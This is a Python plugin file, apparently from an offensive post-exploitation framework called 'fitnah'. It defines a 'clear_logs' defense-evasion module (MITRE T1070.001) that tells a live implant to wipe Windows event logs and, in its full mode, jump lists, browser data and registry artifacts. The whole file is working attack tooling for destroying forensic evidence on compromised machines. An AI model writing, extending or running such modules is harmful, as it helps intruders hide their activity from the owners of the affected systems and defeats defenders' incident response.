"""defense_evasion/clear_logs — artifact + Windows event log cleanup via implant native handler. MITRE T1070.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ClearLogs(BasePlugin):
    NAME        = "clear_logs"
    DESCRIPTION = "Clear Windows event logs and forensic artifacts via implant ArtifactWipe (no PowerShell)."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1070.001"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("full", bool, required=False, default=False,
              help="If true, run full ArtifactWipe_ExecuteAll() — logs + jump lists + browser + registry"),
    )

    @mitre("T1070.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        full = params.get("full", False)
        cmd  = "wipe_artifacts" if full else "wipe_artifacts"
        r    = ctx.send(cmd, {"full": full})
        if r["status"] != "ok":
            return ModuleResult.err(f"clear_logs failed: {r['output']}")
        return ModuleResult.ok(data=r["output"] or "Artifact wipe complete")
